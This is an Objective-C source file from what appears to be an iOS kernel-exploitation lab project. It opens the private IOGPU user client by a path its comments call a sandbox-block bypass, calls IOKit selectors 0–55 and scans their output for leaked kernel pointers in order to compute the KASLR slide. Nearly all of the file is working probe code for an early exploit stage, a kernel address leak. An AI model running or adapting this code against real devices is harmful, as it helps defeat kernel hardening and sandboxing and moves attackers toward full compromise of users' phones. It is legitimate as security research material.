//
//  P042ReachabilityProbe.m
//  P007OpenOnly
//
//  P042 v6: IOGPU KASLR leak test
//  - Use IOGPUDeviceCreate (type=1) to bypass type=0 sandbox block
//  - Sweep selectors 0-55 with output
//  - Scan all output for kernel pointers
//  - Calculate kernel slide if kptr found
//

#import "P042ReachabilityProbe.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>
#import <errno.h>
#import <mach/mach.h>

#define P042_BUILD @"p042-iogpu-kaslr-v6"

static int p042_is_kptr(uint64_t val) {
    if (val >= 0xFFFFFFF000000000ULL && val <= 0xFFFFFFF1FFFFFFFFULL) return 1;
    if (val >= 0xFFFFFFE000000000ULL && val <= 0xFFFFFFE5FFFFFFFFULL) return 1;
    uint64_t stripped = val & 0x0000FFFFFFFFFFFFULL;
    if (stripped >= 0xFFFFFFF000000000ULL && stripped <= 0xFFFFFFF2FFFFFFFFULL) return 1;
    if ((val >> 56) == 0xFF) {
        uint8_t bits47_40 = (val >> 40) & 0xFF;
        if (bits47_40 >= 0xE0 && bits47_40 <= 0xF2) return 1;
    }
    return 0;
}

@implementation P042ReachabilityProbe

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p042_reachability_log.txt"];
    int fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    void (^lg)(NSString *) = ^(NSString *s) {
        [out appendString:s];
        if (![s hasSuffix:@"\n"]) [out appendString:@"\n"];
        if (fd >= 0) {
            const char *c = s.UTF8String;
            write(fd, c, strlen(c));
            if (![s hasSuffix:@"\n"]) write(fd, "\n", 1);
            fcntl(fd, F_FULLFSYNC);
        }
    };

    lg([NSString stringWithFormat:@"=== p042 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P042_BUILD]);
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p042"];
    if (stop) {
        lg(stop);
        if (fd >= 0) close(fd);
        return out;
    }
    lg([LabDeviceProfile identBlock]);

    lg(@"IOGPU KASLR LEAK TEST v6");
    lg(@"Use IOGPUDeviceCreate (type=1) to bypass type=0 block");
    lg(@"Sweep selectors 0-55 with output, scan for kernel pointers");
    lg(@"");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        lg(@"STOP: dlopen failed");
        if (fd >= 0) close(fd);
        return out;
    }

    // Define types manually (iOS SDK has no IOKitLib.h)
    typedef mach_port_t io_object_t;
    typedef io_object_t io_service_t;
    typedef io_object_t io_connect_t;
    typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
    typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
    typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
    typedef kern_return_t (*IOConnectCallMethod_t)(mach_port_t, uint32_t,
        const uint64_t *, uint32_t, const void *, size_t,
        uint64_t *, uint32_t *, void *, size_t *);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    if (!pMatching || !pGet || !pCall || !pMainPort || !pDevCreate || !pGetConn) {
        lg(@"STOP: missing symbols");
        if (fd >= 0) close(fd);
        return out;
    }

    io_service_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) {
        lg(@"STOP: no IOGPU service");
        if (fd >= 0) close(fd);
        return out;
    }

    void *dev = pDevCreate(svc);
    if (!dev) {
        lg(@"STOP: IOGPUDeviceCreate failed");
        pRelease(svc);
        if (fd >= 0) close(fd);
        return out;
    }
    io_connect_t conn = pGetConn(dev);
    lg([NSString stringWithFormat:@"IOGPU conn=%u", conn]);

    // Create a queue so sel=6/7/8/16 work
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate ? pQueueCreate(dev, args, 0x410) : NULL;
    uint32_t qid = (queue && pGetID) ? pGetID(queue) : 1;
    lg([NSString stringWithFormat:@"queue=%p qid=%u", queue, qid]);
    free(args);

    // Sweep selectors 0-55
    lg(@"");
    lg(@"=== Selector sweep (scanning for KPTRs) ===");
    int kptrHits = 0;
    for (uint32_t sel = 0; sel <= 55; sel++) {
        uint64_t outSc[8] = {0};
        uint32_t outScCnt = 8;
        uint8_t outSt[0x1000];
        size_t outStSz = sizeof(outSt);
        
        // Try with no input first
        kern_return_t r = pCall(conn, sel, NULL, 0, NULL, 0, outSc, &outScCnt, outSt, &outStSz);
        if (r == 0) {
            // Check scalars
            for (uint32_t i = 0; i < outScCnt && i < 8; i++) {
                if (p042_is_kptr(outSc[i])) {
                    lg([NSString stringWithFormat:@"  sel=%u outSc[%u]=0x%llx *** KPTR ***", sel, i, outSc[i]]);
                    kptrHits++;
                }
            }
            // Check struct
            for (size_t i = 0; i + 8 <= outStSz && i < 0x1000; i += 8) {
                uint64_t val = *(uint64_t *)(outSt + i);
                if (p042_is_kptr(val)) {
                    lg([NSString stringWithFormat:@"  sel=%u outSt[+0x%zx]=0x%llx *** KPTR ***", sel, i, val]);
                    kptrHits++;
                }
            }
        }
        
        // Try with 1 scalar (qid)
        uint64_t inSc[1] = {qid};
        outScCnt = 8;
        outStSz = sizeof(outSt);
        r = pCall(conn, sel, inSc, 1, NULL, 0, outSc, &outScCnt, outSt, &outStSz);
        if (r == 0) {
            for (uint32_t i = 0; i < outScCnt && i < 8; i++) {
                if (p042_is_kptr(outSc[i])) {
                    lg([NSString stringWithFormat:@"  sel=%u sc1 outSc[%u]=0x%llx *** KPTR ***", sel, i, outSc[i]]);
                    kptrHits++;
                }
            }
            for (size_t i = 0; i + 8 <= outStSz && i < 0x1000; i += 8) {
                uint64_t val = *(uint64_t *)(outSt + i);
                if (p042_is_kptr(val)) {
                    lg([NSString stringWithFormat:@"  sel=%u sc1 outSt[+0x%zx]=0x%llx *** KPTR ***", sel, i, val]);
                    kptrHits++;
                }
            }
        }
    }
    
    lg([NSString stringWithFormat:@"Total KPTR hits: %d", kptrHits]);
    if (kptrHits > 0) {
        lg(@"*** KERNEL POINTER LEAK FOUND ***");
        lg(@"Calculate kernel slide: kptr - A14_23F77_STATIC_BASE");
    } else {
        lg(@"No kernel pointers found in IOGPU selector output");
    }

    // Cleanup
    pRelease(svc);

    lg(@"");
    lg(@"=== SUMMARY ===");
    lg(@"Swept IOGPU selectors 0-55 with output");
    lg(@"Scanned all output for kernel pointers");
    lg(@"NOT KRW. Read-only KASLR leak attempt.");

    if (fd >= 0) {
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
    return out;
}

@end
